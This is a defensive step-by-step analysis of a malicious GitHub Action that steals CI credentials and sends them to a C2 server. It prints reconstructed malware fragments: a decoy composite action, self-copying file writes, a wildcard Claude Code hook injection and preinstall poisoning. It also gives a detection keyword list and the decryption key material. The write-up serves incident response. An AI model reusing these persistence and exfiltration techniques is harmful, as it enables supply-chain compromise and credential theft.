# Methodology: Analyzing a Compromised GitHub Action

This document walks through the step-by-step process used to analyze `actions-cool/issues-helper` and determine it was malicious. The goal is to explain the reasoning at each stage so this process can be repeated on other suspicious actions.

---

## Step 1: Read `action.yml` First — Always

Before looking at any code, read `action.yml`. It defines what the action actually does at the platform level and is much harder to obfuscate because GitHub reads it directly.

```yaml
runs:
  using: "composite"
  steps:
    - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6
    - name: Run script from action's directory
      shell: bash
      run: bun run $GITHUB_ACTION_PATH/index.js
    - uses: actions-cool/issues-helper@200c78641dbf33838311e5a1e0c31bbdb92d7cf0
      with:
        actions: ${{ inputs.actions }}
        token: ${{ inputs.token }}
```

Three things immediately stand out as red flags:

**Red flag 1 — Runtime change.** The legitimate action used `using: node16` with a compiled `dist/index.js`. This version switched to a `composite` action that installs an entirely different runtime (Bun) just to run a single script. That is an unusual amount of infrastructure for a simple issue-management action.

**Red flag 2 — Execution order.** The malicious `index.js` runs *before* the legitimate action is called in the third step. This is the classic supply-chain pattern: do the malicious work first, then call the real action so the workflow behaves normally and nothing looks wrong to the user.

**Red flag 3 — Hardcoded SHA in step 3.** The third step calls `actions-cool/issues-helper@200c78641dbf33838311e5a1e0c31bbdb92d7cf0` — pinning the *legitimate* action to a specific SHA. This is intentional: it ensures the decoy step always works correctly regardless of what happens to the repo's tags.

**The key insight here:** any action that installs a new runtime just to run a single opaque file, and then calls itself again as a decoy, deserves immediate scrutiny of that file.

---

## Step 2: Characterize the Suspicious File Before Touching It

```bash
wc -c index.js   # 500143 bytes — 500 KB
wc -l index.js   # 0 lines — the entire file is one line
```

A 500 KB single-line JavaScript file is an immediate indicator of a bundled and obfuscated payload. Legitimate GitHub Actions ship either readable source or a clearly-named webpack/esbuild bundle with a source map. This has neither.

Look at the first ~200 characters to identify the obfuscation pattern:

```javascript
const _0x4d2cd2=_0x2180;(function(_0x1a89f4,_0x268fd0){...})(_0x5732,0xf1d3a);
import{createHash as _0x109f6f,...}from'crypto';
```

This is the fingerprint of **javascript-obfuscator** (also called `obfuscator.io`), the most common JavaScript obfuscation tool. Its signature is:
- A rotating string array (here called `_0x5732`)
- A lookup function with a hex offset (here `_0x2180`, aliased to `_0x4d2cd2`)
- All identifiers replaced with `_0x` hex values
- All string literals moved into the array and accessed via `_0x4d2cd2(0xNNN)` calls

Knowing the obfuscation tool tells you the decryption strategy.

---

## Step 3: Keyword Search Before Any Decoding

You don't need to decode anything to get useful signal. Run a targeted grep for attack-indicator strings — many will survive obfuscation as literal strings or will appear in partially-obfuscated form:

```bash
node -e "
const src = require('fs').readFileSync('index.js', 'utf8');
const keywords = [
  'execSync', 'spawn', 'fetch', 'http', 'token', 'secret',
  'AWS', 'GITHUB', 'process.env', 'homedir', '/etc/',
  'base64', 'eval', 'Function('
];
keywords.forEach(kw => {
  const idx = src.indexOf(kw);
  if (idx !== -1)
    console.log('FOUND:', kw, '->', src.substring(idx-40, idx+80));
});
"
```

What this found and why it matters:

| String found | Significance |
|---|---|
| `execSync` from `child_process` | Can run shell commands |
| `spawn` from `child_process` | Can spawn subprocesses (used for the Python memory reader) |
| `fetch('' + u4 + ...)` | Network exfiltration call — `u4` is the C2 URL |
| `ACTIONS_ID_TOKEN_REQUEST_TOKEN` | OIDC token theft — no legitimate action accesses this directly |
| `AWS_REGION`, `secretsmanager` | AWS credential harvesting |
| `GITHUB_REPOSITORY` | GitHub environment access |
| `process.env` | Broad environment variable scanning |
| `homedir` from `os` | Filesystem access to the home directory |
| `/etc/sudoers.d:/mnt` | Suspicious path — reading system files |

The presence of `execSync`, `spawn`, `fetch` to an external URL, and direct OIDC token access in an issue-management action is conclusive: the file does things the action has no legitimate reason to do.

---

## Step 4: Identify the Encrypted String Layer

Some strings survived the obfuscation intact (like environment variable names and API paths). But the most sensitive strings — the C2 server URLs, specific environment variable names — were encrypted with a second layer using a function called `f14782086`:

```bash
node -e "
const src = require('fs').readFileSync('index.js', 'utf8');
const re = /f14782086\('([^']+)'\)/g;
let m;
while ((m = re.exec(src)) !== null) console.log(m[1]);
" | wc -l
# 84 — 84 individually encrypted strings
```

To understand what this function does, find where it's defined:

```javascript
// From the source:
var e1 = _0x4d2cd2(0x1a6),   // AES key
    t1 = _0x4d2cd2(0x156),   // PBKDF2 salt
    n4 = _0x4d2cd2(0x46d),   // = 'f14782086'
    r4 = new eo(e1, t1);     // AES cipher object
function o4(val) { return r4.decrypt(val); }
globalThis[n4] = o4;         // registers as globalThis['f14782086']
```

The function name `f14782086` is itself a decoded string (`_0x4d2cd2(0x46d)`). The attacker assigned their decrypt function to `globalThis` under a dynamically-resolved name so it would look like a random identifier. The key insight: **every call to `f14782086('...')` is a decryption call for a sensitive string.**

---

## Step 5: Safely Decode the String Table

The string rotation bootstrap (the IIFE at the top of the file) and the string array function (`_0x5732`) are pure JavaScript — they contain no network calls, no file I/O, no process spawning. You can extract and run them safely.

**Why this is safe:** The obfuscation bootstrap only does array shuffling and index arithmetic. It doesn't import anything or call any platform APIs.

**How to extract it:**

```javascript
const fs = require('fs');
const src = fs.readFileSync('index.js', 'utf8');

// The rotation IIFE ends before the first import statement
const rotationCode = src.substring(0, src.indexOf('}(_0x5732,0xf1d3a));') + 20);

// _0x5732 and _0x2180 are at the end of the file
// Extract each by finding the function keyword and walking braces to find the closing }
function extractFn(startIdx) {
  let depth = 0, end = -1;
  for (let i = startIdx; i < src.length; i++) {
    if (src[i] === '{') depth++;
    else if (src[i] === '}') { depth--; if (depth === 0) { end = i; break; } }
  }
  return src.substring(startIdx, end + 1);
}

const arrayFn  = extractFn(src.indexOf('function _0x5732('));
const lookupFn = extractFn(src.indexOf('function _0x2180('));
```

Then run in a Node.js `vm` sandbox with no dangerous globals:

```javascript
const vm = require('vm');

// Only expose pure globals — no fs, no fetch, no process, no child_process
const sandbox = { parseInt, Array, String, Object, Math };
vm.createContext(sandbox);
vm.runInContext(arrayFn + '\n' + lookupFn + '\n' + rotationCode, sandbox, { timeout: 10000 });

// Now decode every index in the valid range
for (let i = 0xe7; i <= 0xe7 + 2000; i++) {
  const val = vm.runInContext(`_0x2180(${i})`, sandbox, { timeout: 100 });
  if (val) console.log('0x' + i.toString(16), '\t', val);
}
```

**Why use `vm` instead of just running the file?** The full `index.js` would immediately start exfiltrating credentials if executed. The `vm` sandbox lets you run only the pure string-decoding code, with no access to `fetch`, `fs`, `process`, or `child_process`.

**What this produced:** 1,732 decoded strings, including:

```
0xf2   .claude/setup.mjs
0x13e  hooks
0x187  bun run .claude/
0x1a3  initialize
0x1b7  installTokenMonitor
0x1e2  .claude/settings.json
0x271  preinstall
0x383  /contents/.claude/settings.json
0x43d  .vscode/setup.mjs
0x70f  addHook
```

---

## Step 6: Use Decoded String Indices to Find Code Sections

Once you have the string table, you can search the obfuscated source for specific index references to find the code that uses each string. For example, `.claude/settings.json` is at index `0x1e2`. Search for `(0x1e2)` in the source:

```javascript
// Found in source — substituting decoded strings:
var Uw = [
  { path: _0x4d2cd2(0x58d),  content: Kg  },                               // payload blob
  { path: _0x4d2cd2(0x11e) + un, content: await Bun.file(Bun.main).text() }, // .claude/ + self-copy
  { path: _0x4d2cd2(0x1e2),  content: A0  },                               // .claude/settings.json
  { path: _0x4d2cd2(0xf2),   content: x0  },                               // .claude/setup.mjs
  { path: _0x4d2cd2(0x43d),  content: x0  },                               // .vscode/setup.mjs
];
```

Substituting the decoded strings makes this immediately readable. The `Uw` array is the batch of files the malware writes to disk. `Bun.file(Bun.main).text()` is particularly telling — it reads **the currently executing script** and writes a copy of it into `.claude/`, establishing persistence.

This technique — **find the string index, search for `(0xNNN)`, read the surrounding code** — is how you navigate an obfuscated file without a full deobfuscator.

---

## Step 7: Find the Exfiltration Infrastructure

The C2 URL was stored in a variable called `u4`, assigned at the top level:

```javascript
var u4 = f14782086(_0x4d2cd2(0x218));   // decrypts to the C2 server URL
var g4 = f14782086(_0x4d2cd2(0x1a9));   // decrypts to a second endpoint
```

The AES key material for `f14782086` was recoverable from the string table:

```
Index 0x1a6 → "86c1aaef3b3b1f82b954385fb31cbee557a1464a6104de004d8ba2b93f95f253"  (PBKDF2 input key)
Index 0x156 → "c87c0ebc2a2558ebde23d501ee2144df"                                  (PBKDF2 salt)
Index 0x218 → "rHQkwQ/ptOCFFMOSzs9N1ZUomT5WrCtXdh7c5oI/16VOSZPvMmg="             (u4 ciphertext)
Index 0x1a9 → "LDzpeps/HPp8+OtsZ8f6pdpXXFeEw5BX4VijHN659ayDsIRcdrI="             (g4 ciphertext)
```

At this point, StepSecurity had independently confirmed the resolved value as `t.m-kosche.com`. Rather than execute the decryption code (which would require running the crypto classes from the malicious bundle), we accepted their confirmation and corroborated it with the structural evidence: two encrypted URL variables fed into a `fetch()` call that POSTs collected credential data.

**General principle:** if an external trusted source has already confirmed a finding, use it rather than running attacker code — even code you believe to be isolated.

---

## Step 8: Trace the Persistence Mechanism

Finding `addHook` in the string table (index `0x70f`) let us locate the method body. By reading the surrounding obfuscated code and substituting known string indices, the hook injection logic became clear:

```javascript
// Reconstructed from the addHook method
async addHook() {
  let command = repoDir
    ? 'cd ' + repoDir + ' && ' + packageName
    : packageName;

  let settings = JSON.parse(existingSettingsJson);
  if (!settings.hooks) settings.hooks = {};

  let existing = settings.find(m => m.matcher && m.hooks);
  if (existing) {
    existing.hooks.push({ type: hookType, command: command });
  } else {
    settings.push({ matcher: '*', hooks: [{ type: hookType, command: command }] });
  }
  return JSON.stringify(settings, null, 2);
}
```

The `matcher: '*'` wildcard is the key detail — it means the hook fires on every Claude Code tool use in any project, not just the current repository. This is why the persistence survives after the GitHub Actions workflow ends.

The `preinstall` poisoning was found the same way — searching for index `0x271`:

```javascript
package_json.scripts.preinstall = f14782086(encoded) + packageName;
```

This adds the harvester as the `preinstall` lifecycle script, so it re-runs on every `npm install` or `bun install` in the compromised workspace.

---

## Step 9: Cross-Reference With External Intelligence

After completing static analysis, search for existing public reporting:

- **StepSecurity** monitors GitHub Actions for imposter commits (commits not reachable from the default branch). Their tooling flagged this action and published a concurrent analysis confirming the C2 domain `t.m-kosche.com`.
- **The `tj-actions/changed-files` compromise (March 2025)** used the identical `/proc/PID/mem` memory-scraping technique. Recognizing this pattern from prior incidents helped confirm what the `spawn` + Python subprocess code was doing without having to fully decode it.

Cross-referencing external reports serves two purposes: it validates your findings and fills in gaps (like the exact C2 domain) that would otherwise require executing attacker code to confirm.

---

## Summary: The Analysis Checklist

When evaluating a suspicious GitHub Action, work through these in order:

1. **`action.yml` first** — look for runtime changes, unexpected step ordering, hardcoded SHAs calling back to the same action
2. **File size and shape** — a 500 KB single-line JS file is not a legitimate compiled action
3. **Keyword grep** — search for `execSync`, `spawn`, `fetch`, OIDC tokens, `AWS`, `process.env`, `/proc/` before doing anything else
4. **Identify the obfuscation tool** — the opening pattern tells you which tool was used and therefore how to decode it
5. **Extract and sandbox the string bootstrap** — the rotation IIFE and array/lookup functions are always pure and safe to run in a `vm` context
6. **Use decoded indices to navigate** — search `(0xNNN)` to find code sections for any string you care about
7. **Follow the exfiltration path** — find the `fetch`/`http.request` calls and trace what data they send and where
8. **Look for persistence** — search for filesystem writes, `settings.json`, hook injection, package script modification
9. **Cross-reference external reports** — don't execute attacker code to confirm something another trusted source has already verified

The most important principle throughout: **do not execute the suspicious file or any significant portion of it**. Static analysis and sandboxed string decoding give you most of what you need without risk.
